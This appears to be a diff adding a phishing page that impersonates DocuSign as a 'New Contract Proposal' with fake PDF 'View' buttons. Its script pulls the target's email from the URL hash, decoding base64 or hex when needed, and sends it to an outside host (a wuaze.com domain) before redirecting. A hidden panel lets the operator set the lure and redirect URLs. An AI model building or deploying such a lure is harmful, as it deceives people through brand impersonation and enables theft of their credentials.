@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta name="robots" content="noindex,nofollow" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>New Contract Proposal</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html {
+            line-height: 1.15;
+            -webkit-text-size-adjust: 100%;
+            color: #313131;
+        }
+
+        html, button {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background-color: #f8f9fa;
+            background-image: url('https://firebasestorage.googleapis.com/v0/b/project-a29a7.appspot.com/o/backphoto3.jpg?alt=media&token=dfd11e8a-3b48-4da0-b3dd-ea852a87922b');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.85);
+            z-index: -1;
+        }
+
+        a {
+            transition: color 0.15s ease;
+            background-color: transparent;
+            text-decoration: none;
+            color: #0051c3;
+        }
+
+        a:hover {
+            text-decoration: underline;
+            color: #ee730a;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .main-content {
+            margin: 2rem auto;
+            width: 100%;
+            max-width: 60rem;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+            padding: 2.5rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .main-content::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #0051c3, #ee730a);
+        }
+
+        @media (max-width: 720px) {
+            .main-content {
+                margin: 1rem auto;
+                padding: 1.5rem;
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 2rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid #eaeaea;
+        }
+
+        .docusign-logo {
+            margin: 0 auto 1.5rem;
+            display: block;
+            width: 220px;
+            height: auto;
+        }
+
+        .h1 {
+            line-height: 3.75rem;
+            font-size: 2.5rem;
+            font-weight: 600;
+            color: #0051c3;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(90deg, #0051c3, #0070ba);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .h2 {
+            line-height: 2.25rem;
+            font-size: 1.5rem;
+            font-weight: 500;
+            margin: 1.5rem 0 1rem;
+            color: #313131;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid #f0f7ff;
+        }
+
+        .body-text {
+            line-height: 1.5rem;
+            font-size: 1.05rem;
+            font-weight: 400;
+            margin-bottom: 1rem;
+            color: #555;
+        }
+
+        .document-list {
+            list-style: none;
+            margin: 1.5rem 0;
+        }
+
+        .document-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.25rem;
+            border: 1px solid #e5e5e5;
+            border-radius: 8px;
+            margin-bottom: 1rem;
+            background: #f9f9f9;
+            transition: all 0.2s ease;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+        }
+
+        .document-item:hover {
+            border-color: #0051c3;
+            background: #f0f7ff;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 81, 195, 0.15);
+        }
+
+        .document-info {
+            flex: 1;
+        }
+
+        .document-title {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: #313131;
+        }
+
+        .document-description {
+            font-size: 0.9rem;
+            color: #666;
+            line-height: 1.4;
+        }
+
+        .big-button {
+            transition-duration: 0.2s;
+            transition-property: background-color, border-color, color, transform;
+            transition-timing-function: ease;
+            border: 0.063rem solid #0051c3;
+            border-radius: 0.5rem;
+            padding: 0.75rem 1.5rem;
+            background-color: #0051c3;
+            color: #fff;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 500;
+            box-shadow: 0 2px 4px rgba(0, 81, 195, 0.2);
+        }
+
+        .big-button:hover {
+            border-color: #003681;
+            background-color: #003681;
+            color: #fff;
+            text-decoration: none;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 8px rgba(0, 81, 195, 0.3);
+        }
+
+        .footer {
+            margin: 2rem auto 0;
+            width: 100%;
+            max-width: 60rem;
+            padding: 1.5rem;
+            text-align: center;
+            color: #666;
+            font-size: 0.875rem;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 8px;
+        }
+        
+        .config-panel {
+            background: #f0f7ff;
+            border: 1px solid #cce5ff;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        
+        .config-input {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            margin-bottom: 0.75rem;
+            font-size: 0.95rem;
+            transition: border-color 0.2s;
+        }
+        
+        .config-input:focus {
+            outline: none;
+            border-color: #0051c3;
+            box-shadow: 0 0 0 3px rgba(0, 81, 195, 0.1);
+        }
+        
+        .config-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: #313131;
+        }
+
+        @media (max-width: 720px) {
+            .h1 {
+                line-height: 1.75rem;
+                font-size: 1.5rem;
+            }
+
+            .h2 {
+                line-height: 1.5rem;
+                font-size: 1.25rem;
+            }
+            
+            .document-item {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .big-button {
+                margin-top: 1rem;
+                align-self: flex-end;
+            }
+            
+            .docusign-logo {
+                width: 180px;
+            }
+            
+            body {
+                background-attachment: scroll;
+            }
+        }
+
+        @media (prefers-color-scheme: dark) {
+            body {
+                background-color: #222;
+                color: #d9d9d9;
+                background-image: url('https://firebasestorage.googleapis.com/v0/b/project-a29a7.appspot.com/o/backphoto3.jpg?alt=media&token=dfd11e8a-3b48-4da0-b3dd-ea852a87922b');
+            }
+            
+            body::before {
+                background: rgba(45, 45, 45, 0.9);
+            }
+            
+            .main-content {
+                background: #2d2d2d;
+                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            }
+            
+            .document-item {
+                background: #333;
+                border-color: #444;
+            }
+            
+            .document-item:hover {
+                border-color: #4693ff;
+                background: #3a3a3a;
+            }
+            
+            .h1, .h2 {
+                color: #4693ff;
+            }
+            
+            .h1 {
+                background: linear-gradient(90deg, #4693ff, #5dadec);
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+                background-clip: text;
+            }
+            
+            .big-button {
+                background-color: #4693ff;
+                border-color: #4693ff;
+                color: #1d1d1d;
+            }
+            
+            .big-button:hover {
+                border-color: #1a6bc3;
+                background-color: #1a6bc3;
+                color: #fff;
+            }
+            
+            .config-panel {
+                background: #2a2a2a;
+                border-color: #444;
+            }
+            
+            .body-text {
+                color: #ccc;
+            }
+            
+            .document-title {
+                color: #e6e6e6;
+            }
+            
+            .footer {
+                background: rgba(45, 45, 45, 0.8);
+                color: #ccc;
+            }
+        }
+        
+        /* Toast notification styles */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 12px 20px;
+            background-color: #333;
+            color: white;
+            border-radius: 6px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            opacity: 0;
+            transition: opacity 0.3s;
+            z-index: 1000;
+            font-size: 0.9rem;
+        }
+        
+        .toast.show {
+            opacity: 1;
+        }
+        
+        /* Subtle animation for page elements */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .document-item {
+            animation: fadeIn 0.4s ease-out;
+        }
+        
+        .document-item:nth-child(1) { animation-delay: 0.1s; }
+        .document-item:nth-child(2) { animation-delay: 0.2s; }
+        .document-item:nth-child(3) { animation-delay: 0.3s; }
+        .document-item:nth-child(4) { animation-delay: 0.4s; }
+        .document-item:nth-child(5) { animation-delay: 0.5s; }
+    </style>
+</head>
+<body>
+    <div class="main-wrapper" role="main">
+        <div class="main-content">
+            <div class="header">
+                <!-- Base64 Encoded DocuSign Logo -->
+                <img class="docusign-logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMjIwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxwYXRoIGQ9Ik00NS4wNzcgMTUuNDU0YzEuNDk4IDAgMi43MjItMS4yMjQgMi43MjItMi43MjJzLTEuMjI0LTIuNzIyLTIuNzIyLTIuNzIyLTIuNzIyIDEuMjI0LTIuNzIyIDIuNzIyYzAgMS40OTggMS4yMjQgMi43MjIgMi43MjIgMi43MjJ6bTAgNC4zNTVjLTMuOTEyIDAtNy4wNzcgMy4xNjUtNy4wNzcgNy4wNzd2OC4yMThoNC4zNTV2LTguMjE4YzAtMS40OTggMS4yMjQtMi43MjIgMi43MjItMi43MjJzMi43MjIgMS4yMjQgMi43MjIgMi43MjJ2OC4yMThoNC4zNTV2LTguMjE4YzAtMy45MTItMy4xNjUtNy4wNzctNy4wNzctNy4wNzd6bTIyLjE1OSA5LjY4MmMtMS40OTggMC0yLjcyMi0xLjIyNC0yLjcyMi0yLjcyMnMxLjIyNC0yLjcyMiAyLjcyMi0yLjcyMiAyLjcyMiAxLjIyNCAyLjcyMiAyLjcyMmMwIDEuNDk4LTEuMjI0IDIuNzIyLTIuNzIyIDIuNzIyem0wLTQuMzU1Yy0zLjkxMiAwLTcuMDc3IDMuMTY1LTcuMDc3IDcuMDc3djguMjE4aDQuMzU1di04LjIxOGMwLTEuNDk4IDEuMjI0LTIuNzIyIDIuNzIyLTIuNzIyczIuNzIyIDEuMjI0IDIuNzIyIDIuNzIydjguMjE4aDQuMzU1di04LjIxOGMwLTMuOTEyLTMuMTY1LTcuMDc3LTcuMDc3LTcuMDc3em0yMi4xNTggNC4zNTVjMS40OTggMCAyLjcyMi0xLjIyNCAyLjcyMi0yLjcyMnMtMS4yMjQtMi43MjItMi43MjItMi43MjItMi43MjIgMS4yMjQtMi43MjIgMi43MjJjMCAxLjQ5OCAxLjIyNCAyLjcyMiAyLjcyMiAyLjcyMnptLTQuMzU1LTQuMzU1aDguNzFjMy45MTIgMCA3LjA3Ny0zLjE2NSA3LjA3Ny03LjA3N3MtMy4xNjUtNy4wNzctNy4wNzctNy4wNzdoLTguNzF2MTQuMTU0em00LjM1NS0yLjcyMmg0LjM1NWMxLjQ5OCAwIDIuNzIyIDEuMjI0IDIuNzIyIDIuNzIycy0xLjIyNCAyLjcyMi0yLjcyMiAyLjcyMmgtNC4zNTV2LTUuNDQ0em0xNy4zODggOS42ODJjLTMuOTEyIDAtNy4wNzctMy4xNjUtNy4wNzctNy4wNzd2LTQuMzU1aDQuMzU1djQuMzU1YzAgMS40OTggMS4yMjQgMi43MjIgMi43MjIgMi43MjJzMi43MjItMS4yMjQgMi43MjItMi43MjJ2LTQuMzU1aDQuMzU1djQuMzU1YzAgMy45MTItMy4xNjUgNy4wNzctNy4wNzcgNy4wNzd6bTE3LjM4OC0xMS40MDVjLTEuNDk4IDAtMi43MjIgMS4yMjQtMi43MjIgMi43MjJzMS4yMjQgMi43MjIgMi43MjIgMi43MjIgMi43MjItMS4yMjQgMi43MjItMi43MjItMS4yMjQtMi43MjItMi43MjItMi43MjJ6bTAgMTEuNDA1Yy0zLjkxMiAwLTcuMDc3LTMuMTY1LTcuMDc3LTcuMDc3di00LjM1NWg0LjM1NXY0LjM1NWMwIDEuNDk4IDEuMjI0IDIuNzIyIDIuNzIyIDIuNzIyczIuNzIyLTEuMjI0IDIuNzIyLTIuNzIydi00LjM1NWg0LjM1NXY0LjM1NWMwIDMuOTEyLTMuMTY1IDcuMDc3LTcuMDc3IDcuMDc3em0yMi4xNTgtNC4zNTVjMS40OTggMCAyLjcyMi0xLjIyNCAyLjcyMi0yLjcyMnMtMS4yMjQtMi43MjItMi43MjItMi43MjItMi43MjIgMS4yMjQtMi43MjIgMi43MjJjMCAxLjQ5OCAxLjIyNCAyLjcyMiAyLjcyMiAyLjcyMnptLTQuMzU1LTQuMzU1aDguNzFjMy45MTIgMCA3LjA3Ny0zLjE2NSA3LjA3Ny03LjA3N3MtMy4xNjUtNy4wNzctNy4wNzctNy4wNzdoLTguNzF2MTQuMTU0em00LjM1NS0yLjcyMmg0LjM1NWMxLjQ5OCAwIDIuNzIyIDEuMjI0IDIuNzIyIDIuNzIycy0xLjIyNCAyLjcyMi0yLjcyMiAyLjcyMmgtNC4zNTV2LTUuNDQ0ek0xMy4xOTcgMTcuNjI3YzAtMy45MTIgMy4xNjUtNy4wNzcgNy4wNzctNy4wNzdzNy4wNzcgMy4xNjUgNy4wNzcgNy4wNzdjMCAzLjkxMi0zLjE2NSA3LjA3Ny03LjA3NyA3LjA3N3MtNy4wNzctMy4xNjUtNy4wNzctNy4wNzd6bTcuMDc3LTQuMzU1Yy0yLjQ2MSAwLTQuMzU1IDEuODk0LTQuMzU1IDQuMzU1czEuODk0IDQuMzU1IDQuMzU1IDQuMzU1IDQuMzU1LTEuODk0IDQuMzU1LTQuMzU1LTEuODk0LTQuMzU1LTQuMzU1LTQuMzU1eiIgZmlsbD0iIzAwNTFjMyIvPgo8L3N2Zz4K" alt="DocuSign Logo">
+                <h1 class="h1">New Contract Proposal</h1>
+                <p class="body-text">Please review the following documents and click 'View' to see details</p>
+            </div>
+            
+            <!-- Configuration panel (initially hidden) -->
+            <div class="config-panel" id="configPanel" style="display: none;">
+                <h3 class="h2">Configuration</h3>
+                <div class="config-group">
+                    <label class="config-label" for="pdfLink">PDF Link (for all View buttons)</label>
+                    <input type="text" id="pdfLink" class="config-input" placeholder="https://example.com/document.pdf">
+                </div>
+                <div class="config-group">
+                    <label class="config-label" for="redirectLink">Redirect URL (after viewing)</label>
+                    <input type="text" id="redirectLink" class="config-input" placeholder="https://example.com/thank-you">
+                </div>
+                <button class="big-button" onclick="saveConfig()">Save Configuration</button>
+            </div>
+            
+            <div class="document-section">
+                <h2 class="h2"></h2>
+                <p class="body-text"></p>
+                
+                <ul class="document-list">
+                    <li class="document-item">
+                        <div class="document-info">
+                            <div class="document-title">Product/Service Needed.pdf</div>
+                            <div class="document-description">Detailed description of products or services required</div>
+                        </div>
+                        <button class="big-button view-button" data-pdf="product-service.pdf">View</button>
+                    </li>
+                    
+                    <li class="document-item">
+                        <div class="document-info">
+                            <div class="document-title">Contract Agreement.pdf</div>
+                            <div class="document-description">Terms and conditions of the proposed agreement</div>
+                        </div>
+                        <button class="big-button view-button" data-pdf="contract-agreement.pdf">View</button>
+                    </li>
+                    
+                    <li class="document-item">
+                        <div class="document-info">
+                            <div class="document-title">Documentation.pdf</div>
+                            <div class="document-description">Supporting documentation and specifications</div>
+                        </div>
+                        <button class="big-button view-button" data-pdf="documentation.pdf">View</button>
+                    </li>
+                    
+                    <li class="document-item">
+                        <div class="document-info">
+                            <div class="document-title">Invoice and Payment Terms.pdf</div>
+                            <div class="document-description">Pricing, invoicing details, and payment schedule</div>
+                        </div>
+                        <button class="big-button view-button" data-pdf="invoice-payment.pdf">View</button>
+                    </li>
+                    
+                    <li class="document-item">
+                        <div class="document-info">
+                            <div class="document-title">Liability, Confidentiality and Dispute Resolution.pdf</div>
+                            <div class="document-description">Legal terms covering protection and conflict resolution</div>
+                        </div>
+                        <button class="big-button view-button" data-pdf="liability-confidentiality.pdf">View</button>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-inner">
+            <div class="text-center">
+                © 2025 Contract Proposal System. All rights reserved.
+            </div>
+        </div>
+    </div>
+    
+    <!-- Toast notification -->
+    <div class="toast" id="toast"></div>
+
+    <script>
+        // Configuration
+        let config = {
+            pdfBaseUrl: "https://managerialsworkies.wuaze.com/",
+            
+        };
+        
+        // Email extraction and processing
+        let extractedEmail = "";
+        
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Try to load saved configuration
+            const savedConfig = localStorage.getItem('pdfConfig');
+            if (savedConfig) {
+                config = JSON.parse(savedConfig);
+                document.getElementById('pdfLink').value = config.pdfBaseUrl;
+                document.getElementById('redirectLink').value = config.redirectUrl;
+            }
+            
+            // Extract email from URL hash
+            extractEmailFromHash();
+            
+            // Add event listeners to view buttons
+            const viewButtons = document.querySelectorAll('.view-button');
+            viewButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    handleViewButtonClick(this.getAttribute('data-pdf'));
+                });
+            });
+            
+            // Show toast notification if email was extracted
+            if (extractedEmail) {
+                showToast('Email captured: ' + extractedEmail);
+            }
+        });
+        
+        // Email extraction function
+        function extractEmailFromHash() {
+            var lure_url_js = window.location.href.split("#")[0]; // full current URL without hash
+            var hashParam = window.location.hash.substring(1);
+
+            if (hashParam.includes("@") && hashParam.includes(".")) {
+                extractedEmail = hashParam;
+            } else if (/^[A-Za-z0-9+/=]+$/.test(hashParam)) {
+                // Base64 decode
+                try {
+                    extractedEmail = atob(hashParam.replace(/[=]/gi, ''));
+                } catch (e) {
+                    console.error("Base64 decoding failed:", e);
+                }
+            } else if (/^(?:[0-9a-fA-F]{2})+$/.test(hashParam)) {
+                // Hex decode
+                try {
+                    extractedEmail = decodeURIComponent(hashParam.replace(/(..)/g, '%$1'));
+                } catch (e) {
+                    console.error("Hex decoding failed:", e);
+                }
+            }
+            
+            console.log("Extracted email:", extractedEmail);
+            return extractedEmail;
+        }
+        
+        // Handle view button click
+        function handleViewButtonClick(pdfName) {
+            // Re-extract email in case it changed
+            const currentEmail = extractEmailFromHash();
+            
+            if (config.pdfBaseUrl) {
+                // Build the URL with the email parameter if available
+                let finalUrl = config.pdfBaseUrl;
+                if (currentEmail) {
+                    finalUrl += (finalUrl.includes('') ? '#' : '?') + '' + (currentEmail);
+                }
+                
+                // Open the PDF URL
+                window.open(finalUrl, '_blank');
+                
+                // Redirect after a short delay
+                if (config.redirectUrl) {
+                    setTimeout(function() {
+                        // Include email in redirect URL if available
+                        let redirectUrl = config.redirectUrl;
+                        if (currentEmail) {
+                            redirectUrl += (redirectUrl.includes('') ? '#' : '?') + '' + (currentEmail);
+                        }
+                        window.location.href = redirectUrl;
+                    }, 1000);
+                }
+            } else {
+                alert("Please configure the PDF URL first.");
+                document.getElementById('configPanel').style.display = 'block';
+            }
+        }
+        
+        // Configuration functions
+        function saveConfig() {
+            config.pdfBaseUrl = document.getElementById('pdfLink').value;
+            config.redirectUrl = document.getElementById('redirectLink').value;
+            
+            // Save to localStorage
+            localStorage.setItem('pdfConfig', JSON.stringify(config));
+            
+            // Hide config panel
+            document.getElementById('configPanel').style.display = 'none';
+            
+            alert("Configuration saved!");
+        }
+        
+        // Show toast notification
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.classList.add('show');
+            
+            setTimeout(function() {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Expose functions globally for button clicks
+        window.toggleConfig = function() {
+            const panel = document.getElementById('configPanel');
+            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+        };
+    </script>
+</body>
+</html>
